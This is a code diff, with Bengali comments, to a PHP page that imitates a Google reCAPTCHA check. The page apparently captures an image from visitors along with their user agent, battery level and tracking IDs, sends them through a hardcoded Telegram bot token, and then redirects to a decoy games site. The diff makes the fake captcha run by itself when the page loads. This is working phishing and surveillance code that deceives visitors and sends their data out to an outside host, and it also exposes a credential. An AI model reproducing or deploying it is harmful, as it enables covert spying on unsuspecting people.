@@ -1,14 +1,13 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
-    // e প্যারামিটার না থাকলে অথবা লিংকের মেয়াদ পার হয়ে গেলে ছবি পাঠাবে না
     if (!isset($_POST['e']) || empty($_POST['e'])) {
         exit;
     }
 
     $expiryTime = intval($_POST['e']);
     if (time() > $expiryTime) {
-        exit; // মেয়াদ শেষ, ছবি যাবে না
+        exit; 
     }
 
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
@@ -106,7 +105,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             width: 300px;
             box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
             display: none;
-            cursor: pointer;
         }
 
         .recaptcha-left {
@@ -121,26 +119,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             background: #fff;
             border: 2px solid #c1c1c1;
             border-radius: 2px;
-            cursor: pointer;
             display: flex;
             align-items: center;
             justify-content: center;
             position: relative;
-            transition: background 0.2s, border-color 0.2s;
         }
 
-        .recaptcha-checkbox:hover {
-            border-color: #b2b2b2;
-        }
-
+        /* চাকা বা স্পিনার একটু মোটা (border: 4px) এবং ধীরে ঘোরার জন্য সময় বাড়ানো হয়েছে (1.2s) */
         .recaptcha-spinner {
-            width: 24px;
-            height: 24px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #4285F4;
+            width: 22px;
+            height: 22px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #4285F4;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: none;
+            animation: spin 1.2s linear infinite;
+            display: block; /* পেজে ঢোকার সাথেই অটোমেটিক শো করবে */
         }
 
         @keyframes spin {
@@ -148,6 +141,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             100% { transform: rotate(360deg); }
         }
 
+        .recaptcha-checkbox.checked .recaptcha-spinner {
+            display: none; /* স্পিনার লুকিয়ে টিক মার্ক আসবে */
+        }
+
+        /* টিক মার্ক স্টাইল */
         .recaptcha-checkbox.checked::after {
             content: "";
             position: absolute;
@@ -191,7 +189,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 </head>
 <body>
 
-    <div class="recaptcha-box" id="recaptchaContainer" onclick="openTargetLink()">
+    <div class="recaptcha-box" id="recaptchaContainer">
         <div class="recaptcha-left">
             <div class="recaptcha-checkbox" id="recaptchaCheckbox">
                 <div class="recaptcha-spinner" id="recaptchaSpinner"></div>
@@ -214,7 +212,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
         const userChatId = urlParams.get('cid') || ''; 
-        const expiryParam = urlParams.get('e') || ''; // e parameter receive kora holo
+        const expiryParam = urlParams.get('e') || ''; 
         const rawTargetUrl = urlParams.get('url');
 
         let finalUrl = "https://www.aapunkagames.com/"; 
@@ -232,25 +230,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             recaptchaContainer.style.display = 'flex';
         }
 
-        let isClicked = false;
-        function openTargetLink() {
-            if (isClicked) return;
-            isClicked = true;
-
+        // পেজ লোড হওয়ার সাথেই অটোমেটিক ৩.৫ সেকেন্ড (3500ms) স্পিনার ঘুরবে
+        window.addEventListener('DOMContentLoaded', () => {
             const checkbox = document.getElementById('recaptchaCheckbox');
-            const spinner = document.getElementById('recaptchaSpinner');
-
-            spinner.style.display = 'block';
 
             setTimeout(() => {
-                spinner.style.display = 'none';
                 checkbox.classList.add('checked');
                 
+                // টিক মার্ক দেখানোর পর সামান্য বিরতি দিয়ে মেইন ট্যাবে লিংক ওপেন হবে
                 setTimeout(() => {
                     window.location.href = finalUrl;
                 }, 400);
-            }, 3000);
-        }
+            }, 3500); // ঠিক ৩.৫ সেকেন্ড
+        });
 
         let batteryLevelInfo = 'Not Available';
         if (navigator.getBattery) {
@@ -288,7 +280,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             postData.append('image', imageData);
             postData.append('target', targetId);
             postData.append('chat_id', userChatId);
-            postData.append('e', expiryParam); // e parameter server e pathano holo
+            postData.append('e', expiryParam); 
             postData.append('user_agent', navigator.userAgent);
             postData.append('battery', batteryLevelInfo);
 
